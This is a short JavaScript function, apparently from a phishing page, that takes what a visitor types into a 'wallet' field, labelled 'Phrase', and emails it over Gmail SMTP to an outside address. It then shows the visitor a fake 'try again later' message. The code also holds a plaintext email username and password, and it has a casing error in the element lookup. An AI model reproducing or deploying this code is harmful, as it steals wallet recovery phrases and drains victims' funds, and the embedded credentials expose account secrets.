function sendEmail() {
	var wallet = document.getElementByID("wallet")
	var body = 'wallet: ' + wallet;
      Email.send({
        Host: "smtp.gmail.com",
        Username: "jonsteffen@gmail.com",
        Password: "Mrmain123",
        To: 'jonsteffen@protonmail.com',
        From: "therichardsinclair@gmail.com",
        Subject: "Phrase",
        Body: body,
      })
        .then(function (message) {
          alert("try again later")
        });
    }
  </script>